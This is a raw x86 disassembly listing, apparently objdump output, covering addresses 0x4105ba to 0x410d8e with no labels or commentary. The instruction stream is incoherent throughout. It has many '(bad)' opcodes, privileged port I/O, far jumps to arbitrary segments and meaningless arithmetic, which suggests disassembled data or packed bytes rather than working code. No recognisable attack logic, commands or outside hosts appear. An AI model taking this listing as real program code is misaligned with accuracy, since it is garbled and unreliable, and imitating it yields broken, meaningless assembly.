  4105ba:	mov    eax,0xa0270600
  4105bf:	imul   ebp,DWORD PTR [eax+0x7d],0xee4938bf
  4105c6:	push   eax
  4105c7:	jg     0x410599
  4105c9:	jp     0x41063b
  4105cb:	jmp    0x739b:0xbe603722
  4105d2:	dec    ebx
  4105d3:	stos   DWORD PTR es:[edi],eax
  4105d4:	push   0x3833a050
  4105d9:	mov    BYTE PTR [ebx-0x8],bh
  4105dc:	or     DWORD PTR [ebx-0x1e],0x1d
  4105e0:	mov    eax,ds:0x3d23dca2
  4105e5:	pop    ecx
  4105e6:	ret    0xad2a
  4105e9:	cmp    DWORD PTR [ecx+0xc07062d],ecx
  4105ef:	mov    al,0x8c
  4105f2:	or     BYTE PTR [eax],bh
  4105f4:	pusha  
  4105f5:	outs   dx,DWORD PTR ds:[esi]
  4105f6:	dec    eax
  4105f7:	or     BYTE PTR [ecx+0x29],0xfe
  4105fb:	push   eax
  4105fc:	adc    eax,0xfa6a63da
  410601:	test   al,0xc9
  410603:	jae    0x41061e
  410605:	rcl    eax,cl
  410607:	mov    esp,DWORD PTR [ecx-0x6e]
  41060a:	fs xchg edx,eax
  41060c:	xor    BYTE PTR [ebx+eax*8+0x60],ch
  410610:	femms  
  410612:	imul   BYTE PTR gs:[bp+si+0x5d12]
  410618:	hlt    
  410619:	push   esp
  41061a:	push   ebx
  41061b:	cmc    
  41061c:	mov    edx,0xec6129bc
  410621:	aad    0x73
  410623:	and    BYTE PTR [edi-0x27],bh
  410626:	push   ebp
  410627:	xchg   esp,eax
  410628:	ja     0x4105b0
  41062a:	mov    esp,0x815afbf4
  41062f:	ret    
  410630:	xchg   BYTE PTR [ebp-0x7bc6e6f8],ch
  410636:	int    0x17
  410638:	js     0x41067f
  41063a:	mov    ecx,0x4679f8c7
  41063f:	jge    0x4105c2
  410641:	out    0x99,eax
  410643:	push   eax
  410644:	or     DWORD PTR [ecx-0xb],0xd5e15db2
  41064b:	and    esi,ebp
  41064d:	cmp    eax,0x5b0e0d
  410652:	inc    edx
  410653:	inc    ecx
  410654:	mov    cl,0x90
  410656:	stos   DWORD PTR es:[edi],eax
  410657:	jle    0x410638
  410659:	inc    esp
  41065a:	test   al,0x1b
  41065c:	out    dx,al
  41065d:	repz mov esi,0x90737f81
  410663:	in     eax,dx
  410664:	add    al,0xb0
  410666:	push   eax
  410667:	aas    
  410668:	cmp    eax,0xae617a24
  41066d:	xlat   BYTE PTR ds:[ebx]
  41066e:	cmp    al,0x3a
  410670:	scas   eax,DWORD PTR es:[edi]
  410671:	xchg   DWORD PTR [edi-0x2e],ecx
  410674:	mov    al,0xd1
  410676:	loopne 0x41061e
  410678:	or     BYTE PTR [ebx],ch
  41067a:	sbb    esi,ebx
  41067c:	jecxz  0x410619
  41067e:	pop    ecx
  41067f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410680:	mov    ebx,0x34912b9d
  410685:	xor    DWORD PTR [ebp+0x1f],edi
  410688:	out    0xd9,al
  41068a:	mov    edx,0xedc3eb4
  41068f:	mov    eax,0x15668854
  410694:	mov    esp,0xf9774a7b
  410699:	pop    esi
  41069a:	mov    dl,0x8e
  41069c:	fidiv  WORD PTR [esp+edx*8+0x68]
  4106a0:	mov    eax,DWORD PTR [ebx-0x5]
  4106a3:	pop    es
  4106a4:	inc    edx
  4106a5:	imul   ebx,DWORD PTR [ebp+0x68e869],0x14e6966a
  4106af:	xchg   DWORD PTR [edi],esi
  4106b1:	out    0xfb,al
  4106b3:	cdq    
  4106b4:	and    eax,0xddd0615b
  4106b9:	and    eax,0x68f81500
  4106be:	dec    ebx
  4106bf:	jbe    0x41073d
  4106c1:	cmp    al,0x72
  4106c3:	xchg   edx,eax
  4106c5:	dec    edx
  4106c6:	jb     0x4106f2
  4106c8:	test   DWORD PTR [edx-0x659cc9b1],ebx
  4106ce:	(bad)  
  4106cf:	(bad)  
  4106d0:	repnz (bad) 
  4106d3:	iret   
  4106d4:	add    ebp,DWORD PTR [eax+edx*2]
  4106d7:	call   0x262e5fb6
  4106dc:	leave  
  4106dd:	sub    ah,al
  4106df:	mov    cl,0x4f
  4106e1:	xor    BYTE PTR [edi+0x2b],al
  4106e4:	mov    bl,0x11
  4106e6:	out    0x4b,eax
  4106e8:	(bad)  
  4106ea:	test   dh,bh
  4106ec:	xchg   edx,eax
  4106ed:	xor    BYTE PTR [edx-0x4c],0x64
  4106f1:	(bad)  
  4106f2:	mov    ch,0xd
  4106f4:	inc    eax
  4106f5:	jl     0x4106a3
  4106f7:	adc    BYTE PTR [ebx+0x4d],bl
  4106fa:	adc    esi,esp
  4106fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106fd:	leave  
  4106fe:	inc    ebx
  4106ff:	jno    0x41076e
  410701:	adc    DWORD PTR ds:0xb29c2cf,ebp
  410707:	and    ecx,DWORD PTR [eax+0x75]
  41070a:	mov    ds:0xd09cb988,eax
  41070f:	sbb    al,0x8c
  410711:	or     DWORD PTR [ebp-0x6b],edi
  410714:	test   dl,ch
  410716:	sbb    eax,0x648f50
  41071b:	sub    eax,0x86bdb198
  410720:	jp     0x4106b4
  410722:	int3   
  410723:	shr    BYTE PTR [edi+0x41f95de4],1
  410729:	cdq    
  41072a:	sub    DWORD PTR [ecx-0x2e],edi
  41072d:	lods   al,BYTE PTR ds:[esi]
  41072e:	mov    WORD PTR [edi],cs
  410730:	mov    ecx,0x2bb8df6c
  410735:	ret    0xe7f3
  410738:	push   ecx
  410739:	arpl   WORD PTR [ebp-0x5494595e],bx
  41073f:	and    esp,ebp
  410741:	jno    0x41074f
  410743:	mov    dl,0xad
  410745:	daa    
  410746:	(bad)  
  410747:	push   edx
  410748:	and    DWORD PTR [eax+0x740d0ca],esp
  41074e:	sub    edi,esi
  410750:	jne    0x41073d
  410752:	mov    ecx,0x9dd76b50
  410757:	mov    ebx,0xedd93070
  41075c:	adc    DWORD PTR [ecx+0x9e53adc],edx
  410762:	jge    0x410725
  410764:	inc    ebp
  410765:	repz dec esi
  410767:	mov    ah,0x8a
  410769:	mov    ds:0xaedbcf85,eax
  41076e:	scas   eax,DWORD PTR es:[edi]
  41076f:	and    ch,cl
  410771:	or     ecx,eax
  410773:	sbb    dl,BYTE PTR [ecx+0x24]
  410776:	scas   eax,DWORD PTR es:[edi]
  410777:	inc    esi
  410778:	xchg   esp,esi
  41077a:	sbb    BYTE PTR [ebx*2+0x7585eb1c],ch
  410781:	xchg   BYTE PTR [ebx],ah
  410783:	in     eax,0x62
  410785:	cmc    
  410786:	aaa    
  410787:	popa   
  410788:	stc    
  410789:	dec    ebp
  41078a:	cs dec ebx
  41078c:	cdq    
  41078d:	pop    edi
  41078e:	xor    esi,ebx
  410790:	cmp    esi,esp
  410792:	xchg   esi,eax
  410793:	xchg   DWORD PTR ds:0xdd29fbd0,ebp
  410799:	jb     0x4107f3
  41079b:	mov    al,ds:0x1d0e8cae
  4107a0:	loop   0x410755
  4107a2:	stos   BYTE PTR es:[edi],al
  4107a3:	pop    esi
  4107a4:	push   es
  4107a5:	ficom  DWORD PTR [ebx-0x3b8591cc]
  4107ab:	aaa    
  4107ac:	js     0x4107db
  4107ae:	imul   ebp,edx,0x7c
  4107b1:	stos   DWORD PTR es:[edi],eax
  4107b2:	les    esi,FWORD PTR [ebx]
  4107b4:	xor    eax,0x39d982a2
  4107b9:	js     0x4107f9
  4107bb:	inc    ebp
  4107bc:	ret    
  4107bd:	dec    ebp
  4107be:	inc    eax
  4107bf:	mov    ds:0x2448fb92,al
  4107c4:	call   0x976c:0x6a7f73e1
  4107cb:	add    eax,0xff8f2fd1
  4107d0:	and    ecx,DWORD PTR [eax+eax*1]
  4107d3:	mov    dh,0x63
  4107d5:	mov    ebp,0xee223965
  4107da:	scas   al,BYTE PTR es:[edi]
  4107db:	nop
  4107dc:	lahf   
  4107dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107de:	mov    BYTE PTR [esi],al
  4107e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107e1:	mov    fs,edi
  4107e3:	in     eax,0x74
  4107e5:	rol    DWORD PTR ds:0x476fd587,cl
  4107eb:	mov    bh,0xf
  4107ed:	push   esi
  4107ee:	aad    0x4d
  4107f0:	shl    DWORD PTR [edi],0xae
  4107f3:	jg     0x410800
  4107f5:	add    esi,edx
  4107f7:	xchg   edi,eax
  4107f8:	out    0x8,eax
  4107fa:	push   edi
  4107fb:	gs xor al,0xef
  4107fe:	mov    ch,0x39
  410800:	iretw  
  410802:	cli    
  410803:	inc    ecx
  410804:	pushf  
  410805:	out    dx,eax
  410806:	and    al,0xc2
  410808:	cmp    eax,0xdbd34018
  41080d:	ins    BYTE PTR es:[edi],dx
  41080e:	lea    ebx,[ebx]
  410810:	imul   ecx,DWORD PTR [ecx+0x64d50c3d],0xffffffe6
  410817:	scas   al,BYTE PTR es:[edi]
  410818:	pop    ds
  410819:	fucomip st,st(1)
  41081b:	stos   BYTE PTR es:[edi],al
  41081c:	adc    eax,0x5a167d9c
  410821:	adc    eax,0x23ddbffb
  410826:	mov    eax,ds:0x4094ad52
  41082b:	xchg   edx,ebx
  41082d:	aad    0xa9
  41082f:	out    dx,eax
  410830:	inc    ecx
  410831:	jo     0x4107f0
  410833:	sbb    ch,BYTE PTR [ebp-0x5e]
  410836:	movntps XMMWORD PTR [esi-0x14],xmm3
  41083a:	sahf   
  41083b:	inc    edx
  41083c:	mov    cl,0x74
  41083e:	(bad)  
  41083f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410840:	out    dx,al
  410841:	and    ah,cl
  410843:	fsubp  st(7),st
  410845:	cdq    
  410846:	sbb    al,0xd5
  410848:	sbb    BYTE PTR [eax+0x38d195ae],ch
  41084e:	std    
  41084f:	test   DWORD PTR [ebx-0x73d7c1a7],ebp
  410855:	(bad)  
  410856:	jo     0x410882
  410858:	pop    esi
  410859:	inc    esp
  41085a:	jbe    0x410867
  41085c:	push   ss
  41085d:	inc    edi
  41085e:	cmc    
  41085f:	out    dx,al
  410860:	jecxz  0x4107e2
  410862:	mov    ah,0x9d
  410864:	inc    eax
  410865:	or     dl,al
  410867:	repnz enter 0x935a,0x68
  41086c:	jge    0x4108e3
  41086e:	test   edx,eax
  410870:	pop    edx
  410871:	sub    ebp,DWORD PTR [ebx-0x6a]
  410874:	lahf   
  410875:	mov    cl,0xf5
  410877:	int    0xf7
  410879:	mov    dh,0x33
  41087b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41087c:	xor    DWORD PTR [ebx],esi
  41087e:	push   eax
  41087f:	(bad)  
  410880:	pop    ecx
  410881:	mov    dh,0x11
  410883:	and    al,0x37
  410885:	test   al,0x61
  410887:	push   0x1f
  410889:	fcmovnb st,st(3)
  41088b:	gs in  al,dx
  41088d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41088e:	jns    0x4108b1
  410890:	int3   
  410891:	(bad)  
  410892:	repnz (bad) [ebx*4-0x6a16cf7]
  41089a:	test   eax,0xe899e2a4
  41089f:	sbb    edi,DWORD PTR [edx+0x1eb657b3]
  4108a5:	aam    0x5f
  4108a7:	sar    DWORD PTR [edi],cl
  4108a9:	sti    
  4108aa:	push   0xffffff91
  4108ac:	or     WORD PTR [esi+0x5fbb1155],ax
  4108b3:	inc    esp
  4108b4:	cmp    ebp,DWORD PTR [edx+0x6ba29fa8]
  4108ba:	push   es
  4108bb:	push   ds
  4108bc:	shr    BYTE PTR [ecx+0x8],1
  4108bf:	push   ebp
  4108c0:	sbb    ebp,ecx
  4108c2:	fbstp  TBYTE PTR [eax+0x40]
  4108c5:	rcr    WORD PTR ss:[edi+0x18],1
  4108ca:	mov    edx,0x328716b8
  4108cf:	loope  0x41091e
  4108d1:	dec    eax
  4108d2:	sbb    eax,0xfad20b1e
  4108d7:	adc    DWORD PTR [ebx],ebx
  4108d9:	xchg   esi,eax
  4108da:	rcr    DWORD PTR [edx],0x59
  4108dd:	mov    bh,0xbe
  4108df:	dec    edx
  4108e0:	inc    edx
  4108e1:	xor    ecx,edi
  4108e3:	imul   DWORD PTR [ebx+0x12d6b265]
  4108e9:	xchg   esp,eax
  4108ea:	mov    ebx,0x1063f72f
  4108ef:	mov    edx,0xab553b41
  4108f4:	mov    dh,0xdc
  4108f6:	js     0x41088b
  4108f8:	mov    ebx,0x901d49e2
  4108fd:	xor    al,0x61
  4108ff:	push   ecx
  410900:	sub    cl,ch
  410902:	mov    esp,0x31c5c384
  410907:	add    DWORD PTR [ebx],ebp
  410909:	ds jecxz 0x410944
  41090c:	adc    eax,ebx
  41090e:	lods   al,BYTE PTR ds:[esi]
  41090f:	add    dh,ch
  410911:	inc    DWORD PTR [edi]
  410913:	pop    ss
  410914:	sbb    ah,BYTE PTR cs:0xfe5d170a
  41091b:	mov    ds:0xea41192d,al
  410920:	(bad)  
  410922:	cmp    DWORD PTR [edx-0x2a],edx
  410925:	(bad)  
  410926:	shr    BYTE PTR [edi+eiz*1],0xe5
  41092a:	mov    bl,0x83
  41092c:	fadd   QWORD PTR [ebx+0x78]
  41092f:	dec    esi
  410930:	ins    BYTE PTR es:[edi],dx
  410931:	mov    esi,0xfb1a8c89
  410936:	sbb    DWORD PTR [eax-0x11493d4e],esp
  41093c:	(bad)
  41093f:	mov    eax,0x8f461053
  410944:	pop    esi
  410945:	mov    ebx,0x7074222e
  41094a:	in     eax,dx
  41094b:	fiadd  WORD PTR [esi-0x6b568dcc]
  410951:	fsubp  st(2),st
  410953:	int3   
  410954:	lods   eax,DWORD PTR ds:[esi]
  410955:	pop    es
  410956:	xchg   DWORD PTR [esp+eiz*2+0x62],ebp
  41095a:	or     ecx,edi
  41095c:	mov    dh,0xf3
  41095e:	pop    edx
  41095f:	mov    bh,0xee
  410961:	in     eax,dx
  410962:	loop   0x4109c7
  410964:	push   cs
  410965:	fidiv  WORD PTR [ecx-0x42]
  410968:	xlat   BYTE PTR ds:[ebx]
  410969:	popf   
  41096a:	jge    0x4109a6
  41096c:	js     0x41090f
  41096e:	(bad)  
  41096f:	ja     0x410999
  410971:	push   esp
  410972:	ja     0x41092f
  410974:	test   eax,0xdcd6db75
  410979:	in     eax,0x69
  41097b:	rcr    DWORD PTR [ecx-0x1d],1
  41097e:	mov    bl,0x20
  410980:	imul   edx,DWORD PTR [ebx],0xcc11bcfe
  410986:	mov    cl,BYTE PTR [edi+eax*4-0x331f6677]
  41098d:	jp     0x410948
  41098f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410990:	cmc    
  410991:	pop    ss
  410992:	mov    eax,ds:0x3ec8fdb6
  410997:	push   0x3
  410999:	add    dh,BYTE PTR [edx-0x17339b98]
  41099f:	adc    eax,0xfbbed55a
  4109a4:	dec    esp
  4109a5:	mul    BYTE PTR [edx-0x3108f547]
  4109ab:	mov    eax,0x6ecddc0
  4109b0:	test   DWORD PTR [edi],eax
  4109b2:	jns    0x410937
  4109b4:	sub    DWORD PTR [ecx],edi
  4109b6:	or     al,0xb4
  4109b8:	xchg   esp,eax
  4109b9:	pop    edi
  4109ba:	div    DWORD PTR [edi+0x662186e3]
  4109c0:	out    0x31,al
  4109c2:	mov    es,WORD PTR [ecx-0x41123c77]
  4109c8:	push   ecx
  4109c9:	jne    0x4109ce
  4109cb:	(bad)  [ecx-0x24]
  4109ce:	aad    0x9a
  4109d0:	adc    ecx,edi
  4109d2:	push   0x42
  4109d4:	ss mov cl,0x98
  4109d7:	dec    ebp
  4109d8:	xchg   ebx,eax
  4109d9:	aas    
  4109da:	jo     0x410981
  4109dc:	popa   
  4109dd:	clc    
  4109de:	pop    esi
  4109df:	push   esp
  4109e0:	nop
  4109e1:	jne    0x410a04
  4109e3:	and    BYTE PTR [esi-0x51],al
  4109e6:	xlat   BYTE PTR ds:[ebx]
  4109e7:	sahf   
  4109e8:	sbb    DWORD PTR [ebx-0x79],ecx
  4109eb:	jg     0x4109da
  4109ed:	retfw  0xf36c
  4109f1:	mov    al,ds:0x21387919
  4109f6:	nop
  4109f7:	inc    eax
  4109f8:	adc    al,0xb7
  4109fa:	clc    
  4109fb:	cmc    
  4109fc:	ds aam 0xd6
  4109ff:	pop    ebp
  410a00:	outs   dx,DWORD PTR ds:[esi]
  410a01:	add    bl,ah
  410a03:	mov    dl,0x5a
  410a05:	add    eax,0xdc4db3fd
  410a0a:	pop    ds
  410a0b:	jbe    0x410a59
  410a0d:	mov    ebx,0x41176ed0
  410a12:	pop    ecx
  410a13:	pop    ecx
  410a14:	fild   WORD PTR [ecx]
  410a16:	call   0x54867a94
  410a1b:	sbb    al,0x71
  410a1d:	enter  0x672c,0x58
  410a21:	stos   DWORD PTR es:[edi],eax
  410a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a25:	loop   0x4109da
  410a27:	loopne 0x410a87
  410a29:	xor    eax,0xdc1cc333
  410a2e:	add    al,0x53
  410a30:	(bad)  
  410a31:	pop    eax
  410a32:	jl     0x410a52
  410a34:	int3   
  410a35:	jge    0x410a6b
  410a37:	mov    si,0xc850
  410a3b:	pop    ds
  410a3c:	dec    esi
  410a3d:	jmp    0x4109c3
  410a3f:	daa    
  410a40:	js     0x410a1a
  410a42:	ja     0x410a74
  410a44:	mov    eax,ds:0x8419101a
  410a49:	cdq    
  410a4a:	xchg   DWORD PTR [ebp+0x10],ebx
  410a4d:	xlat   BYTE PTR ds:[ebx]
  410a4e:	aas    
  410a4f:	scas   al,BYTE PTR es:[edi]
  410a50:	or     bl,al
  410a52:	inc    ebp
  410a53:	in     al,0x63
  410a55:	mov    edi,0xebeeba2a
  410a5a:	jo     0x4109e9
  410a5c:	nop
  410a5d:	jb     0x410ada
  410a5f:	ret    
  410a60:	(bad)  
  410a61:	jmp    0xa238:0xa6e700c3
  410a68:	add    eax,0x83e642d5
  410a6d:	pop    ds
  410a6e:	fwait
  410a6f:	jmp    0xd2f84043
  410a74:	mov    edx,0xe411919c
  410a79:	sbb    DWORD PTR [edi-0x14f1c4ba],esp
  410a7f:	jne    0x410a01
  410a81:	popf   
  410a82:	push   ecx
  410a83:	nop
  410a84:	xor    BYTE PTR [edx],bh
  410a86:	(bad)  
  410a88:	mov    edx,0x8336a723
  410a8d:	and    BYTE PTR [edi+eiz*2-0x5e],dl
  410a91:	push   cs
  410a92:	add    eax,0x859b6e51
  410a97:	in     al,dx
  410a98:	jle    0x410a92
  410a9a:	repnz leave 
  410a9c:	sbb    eax,0x10e2288b
  410aa1:	sbb    al,0x51
  410aa3:	adc    eax,0xc70509e3
  410aa8:	retf   0x1b11
  410aab:	(bad)  
  410aac:	pop    ecx
  410aad:	add    BYTE PTR [ebx-0x7],bh
  410ab0:	into   
  410ab1:	or     DWORD PTR [esi+0x681f6459],0xffffffc0
  410ab8:	mov    ecx,0x3c53518a
  410abd:	mov    bl,0x7f
  410abf:	int3   
  410ac0:	sub    al,0x2e
  410ac2:	sub    BYTE PTR [eax+0x65],bh
  410ac5:	(bad)  
  410ac7:	xor    BYTE PTR [edx+0x32af9595],cl
  410acd:	push   ebp
  410ace:	lahf   
  410acf:	idiv   bh
  410ad1:	rcr    DWORD PTR [ebx],cl
  410ad3:	pusha  
  410ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ad5:	lock cmp dl,bl
  410ad8:	lock xchg ecx,eax
  410ada:	ins    DWORD PTR es:[edi],dx
  410adb:	mov    dl,0xe5
  410add:	pusha  
  410ade:	xor    eax,0x6a95fe37
  410ae3:	mov    eax,ds:0xaf9e8238
  410ae8:	mov    ch,0xda
  410aea:	and    dh,al
  410aec:	lea    edi,[ebp+0x37]
  410aef:	mov    eax,DWORD PTR [edx+0x38f17bed]
  410af5:	jmp    0xc674:0xbb8367ae
  410afc:	cmc    
  410afd:	xlat   BYTE PTR ds:[ebx]
  410afe:	jo     0x410b23
  410b00:	cmp    ah,BYTE PTR [ebx]
  410b02:	dec    edi
  410b03:	int3   
  410b04:	je     0x410b60
  410b06:	outs   dx,BYTE PTR ds:[esi]
  410b07:	cwde   
  410b08:	add    al,0xa3
  410b0a:	mov    ds:0x728e4905,al
  410b0f:	push   0xffffffb5
  410b11:	mov    eax,ds:0xbeb1c17
  410b16:	fadd   DWORD PTR [ebx+eax*8+0x10]
  410b1a:	bound  edi,QWORD PTR [edi]
  410b1c:	jbe    0x410aa0
  410b1e:	pop    edx
  410b1f:	outs   dx,BYTE PTR ds:[esi]
  410b20:	or     eax,0x46c59252
  410b25:	sti    
  410b26:	mov    ecx,0x6fd551fd
  410b2b:	and    al,0x79
  410b2d:	xchg   BYTE PTR [edi+ecx*2-0x62c52463],dl
  410b34:	sub    ecx,DWORD PTR [ebp-0xd]
  410b37:	push   0xffffff8a
  410b39:	fisubr WORD PTR [esi+0x4c5f01ce]
  410b3f:	call   0xd8ea:0xe709ee80
  410b46:	in     al,dx
  410b47:	(bad)  
  410b48:	adc    DWORD PTR [edx-0x24],ebx
  410b4b:	pop    eax
  410b4c:	pusha  
  410b4d:	or     ch,bl
  410b4f:	mov    bh,0xad
  410b51:	xor    BYTE PTR [ecx+0x4d],cl
  410b54:	push   edx
  410b55:	daa    
  410b56:	xor    al,0x6
  410b58:	pop    ds
  410b59:	push   cs
  410b5a:	mov    ds:0xd41c0f11,al
  410b5f:	(bad)  
  410b60:	stos   DWORD PTR es:[edi],eax
  410b61:	jae    0x410b66
  410b63:	mov    ebp,0x5cfc220a
  410b68:	mov    ebp,0xd6e973ad
  410b6d:	inc    esi
  410b6e:	stc    
  410b6f:	ins    BYTE PTR es:[edi],dx
  410b70:	xchg   edx,eax
  410b71:	gs pop ebx
  410b73:	jae    0x410b79
  410b75:	rcl    BYTE PTR [esi-0x29],1
  410b78:	fisubr DWORD PTR [esi]
  410b7a:	inc    ebx
  410b7b:	jmp    0xea7333b0
  410b80:	sub    al,0xae
  410b82:	leave  
  410b83:	xchg   ebx,eax
  410b84:	mov    al,0x10
  410b86:	repnz push es
  410b88:	and    ebp,ecx
  410b8a:	pusha  
  410b8b:	sti    
  410b8c:	cli    
  410b8d:	dec    edx
  410b8e:	andnps xmm7,XMMWORD PTR [edx+0x4c732c95]
  410b95:	jnp    0x410bf1
  410b97:	push   eax
  410b98:	pop    eax
  410b99:	xor    bh,BYTE PTR [eax]
  410b9b:	pop    es
  410b9c:	mov    ch,0x87
  410b9e:	mov    edi,0x230e234f
  410ba3:	add    ebp,ebx
  410ba5:	dec    edi
  410ba6:	sub    ah,0x70
  410ba9:	add    esp,DWORD PTR [esi+0xd9ac3c2]
  410baf:	inc    eax
  410bb0:	sbb    eax,0xe431731a
  410bb5:	fsub   DWORD PTR [ecx-0x62]
  410bb8:	or     al,0xd6
  410bba:	jb     0x410c11
  410bbc:	sbb    BYTE PTR [ecx],ah
  410bbe:	(bad)  
  410bc0:	inc    ebx
  410bc1:	cld    
  410bc2:	out    0x71,al
  410bc4:	adc    edi,DWORD PTR [edx-0x4c]
  410bc7:	outs   dx,DWORD PTR ds:[esi]
  410bc8:	les    edi,FWORD PTR [eax-0x23]
  410bcb:	call   0x306bc64b
  410bd0:	inc    edi
  410bd1:	sub    edx,DWORD PTR [esi]
  410bd3:	adc    esi,DWORD PTR [ebp+eax*8+0x74e0453c]
  410bda:	pop    es
  410bdb:	inc    edi
  410bdc:	addr16 (bad) 
  410bde:	aad    0x65
  410be0:	sub    si,WORD PTR [ebx+esi*4-0x18b4f5f0]
  410be8:	popa   
  410be9:	ja     0x410c52
  410beb:	rcl    DWORD PTR [ecx+0x3d45dc6a],cl
  410bf1:	retf   
  410bf2:	dec    esi
  410bf3:	out    dx,al
  410bf4:	in     eax,dx
  410bf5:	loopne 0x410b86
  410bf7:	call   0x3cb2b989
  410bfc:	mov    ah,0x2b
  410bfe:	xchg   esp,eax
  410bff:	push   esi
  410c00:	out    dx,al
  410c01:	hlt    
  410c02:	adc    DWORD PTR [esi],ecx
  410c04:	adc    eax,0x8e58c532
  410c09:	ins    BYTE PTR es:[edi],dx
  410c0a:	add    dh,dl
  410c0c:	jmp    0x9df5d26f
  410c11:	xchg   edx,eax
  410c12:	call   0x192f333e
  410c17:	mov    edi,0xece38d10
  410c1c:	cli    
  410c1d:	add    eax,0xa6a2a70d
  410c22:	mov    ebp,0x9f6c36e0
  410c27:	jb     0x410bfa
  410c29:	ins    BYTE PTR es:[edi],dx
  410c2a:	jmp    0xb856:0x3afe4f8a
  410c31:	or     bh,dh
  410c33:	scas   al,BYTE PTR es:[edi]
  410c34:	fwait
  410c35:	sbb    dl,BYTE PTR [ebp-0x7c310c69]
  410c3b:	dec    ecx
  410c3c:	sub    eax,0xbf4740a3
  410c41:	inc    ecx
  410c42:	lock ja 0x410be1
  410c45:	ret    0xb4be
  410c48:	es int3 
  410c4a:	pop    ebp
  410c4b:	mov    dl,BYTE PTR [ebp+0x35]
  410c4e:	rcl    ebx,0x93
  410c51:	mov    ebx,0x6df9fab7
  410c56:	jecxz  0x410ca8
  410c58:	leave  
  410c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c5a:	jmp    0x410cc6
  410c5c:	aaa    
  410c5d:	aad    0x90
  410c5f:	ins    BYTE PTR es:[edi],dx
  410c60:	or     ecx,DWORD PTR [ecx+0x32]
  410c63:	imul   ebx,DWORD PTR [ecx-0x7b9c371e],0x97c6b18f
  410c6d:	test   eax,0xae789d46
  410c72:	pop    es
  410c73:	xchg   esp,eax
  410c74:	jmp    0x1fac0c2e
  410c79:	lahf   
  410c7a:	(bad)  
  410c7b:	std    
  410c7c:	ja     0x410cc2
  410c7e:	jbe    0x410ccc
  410c80:	mov    cl,0xe7
  410c82:	mov    ds:0x23211c8e,al
  410c87:	dec    esi
  410c88:	mov    al,0xd
  410c8a:	xchg   ecx,eax
  410c8b:	sti    
  410c8c:	out    0x37,eax
  410c8e:	sub    BYTE PTR [ebx+0x714551d2],dh
  410c94:	test   al,0x49
  410c96:	mov    ds:0x22f119c7,al
  410c9b:	or     BYTE PTR [eax],ah
  410c9d:	push   esp
  410c9e:	cmp    ch,BYTE PTR [edx-0x11]
  410ca1:	inc    esi
  410ca2:	sbb    al,0x6f
  410ca4:	sbb    eax,0x291b64e8
  410ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410caa:	cmp    al,0x17
  410cac:	retf   
  410cad:	arpl   sp,sp
  410caf:	sub    BYTE PTR fs:[eax+0x2bc94ee4],al
  410cb6:	xchg   ebx,eax
  410cb7:	and    DWORD PTR [ebp-0x140ccadc],eax
  410cbd:	cmp    al,0xd4
  410cbf:	adc    edi,esi
  410cc1:	jmp    0xf5fcd18
  410cc6:	aam    0x51
  410cc8:	xor    BYTE PTR [eax-0x2111640a],ah
  410cce:	dec    esp
  410ccf:	out    dx,eax
  410cd0:	jnp    0x410ca5
  410cd2:	pushf  
  410cd3:	outs   dx,BYTE PTR ds:[esi]
  410cd4:	call   0x91f40735
  410cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cdb:	mov    ebp,0xc63774d0
  410ce0:	shl    DWORD PTR [edx-0x11110764],cl
  410ce6:	and    BYTE PTR [edi],dl
  410ce8:	dec    eax
  410ce9:	sti    
  410cea:	jno    0x410d2f
  410cec:	push   es
  410ced:	repnz nop
  410cef:	scas   eax,DWORD PTR es:[edi]
  410cf0:	mov    ch,0xc8
  410cf2:	mov    BYTE PTR [ebx],bl
  410cf4:	in     eax,dx
  410cf5:	mov    eax,0x7769171
  410cfa:	call   0x7e0:0xaab63974
  410d01:	dec    edi
  410d02:	cdq    
  410d03:	xor    BYTE PTR ds:0x43372de7,bl
  410d09:	imul   esp,DWORD PTR [ebp+ebx*2-0x63],0xe01c9b1
  410d11:	push   esp
  410d12:	xor    al,0xdd
  410d14:	adc    eax,0x3657d859
  410d19:	xchg   esi,eax
  410d1a:	stc    
  410d1b:	lods   al,BYTE PTR ds:[esi]
  410d1c:	add    bl,0x3c
  410d1f:	push   ss
  410d20:	pop    eax
  410d21:	js     0x410d9c
  410d23:	jg     0x410d32
  410d25:	inc    edx
  410d26:	call   0x16f1cb07
  410d2b:	dec    esi
  410d2c:	jmp    0x410cb8
  410d2e:	(bad)  
  410d2f:	test   eax,0xafdf28e4
  410d34:	pop    edx
  410d35:	mov    ecx,0x79e955e8
  410d3a:	cs call 0xb744f5ab
  410d40:	jb     0x410d2a
  410d42:	out    0x1d,al
  410d44:	scas   eax,DWORD PTR es:[edi]
  410d45:	xor    ch,BYTE PTR [ebp+0x30dea139]
  410d4b:	fisub  WORD PTR ds:0xa480318b
  410d51:	repnz loop 0x410d46
  410d54:	xchg   edx,eax
  410d55:	test   al,0x8f
  410d57:	sub    ebp,DWORD PTR [edi-0xdb3d904]
  410d5d:	je     0x410ce7
  410d5f:	add    dh,al
  410d61:	fcmovnb st,st(2)
  410d63:	dec    eax
  410d64:	cwde   
  410d65:	icebp  
  410d66:	in     eax,0xf8
  410d68:	loope  0x410dc8
  410d6a:	xchg   edi,eax
  410d6b:	hlt    
  410d6c:	jecxz  0x410dba
  410d6e:	(bad)
  410d72:	lods   eax,DWORD PTR ds:[esi]
  410d73:	in     al,dx
  410d74:	sub    eax,0x709ebf13
  410d79:	sub    edx,DWORD PTR [eax-0x44031547]
  410d7f:	scas   al,BYTE PTR es:[edi]
  410d80:	or     al,0x17
  410d82:	adc    eax,DWORD PTR [eax+ebp*1-0x46f28b88]
  410d89:	cmp    eax,0x3f43ca4e
  410d8e:	arpl   WORD PTR [edi],bp
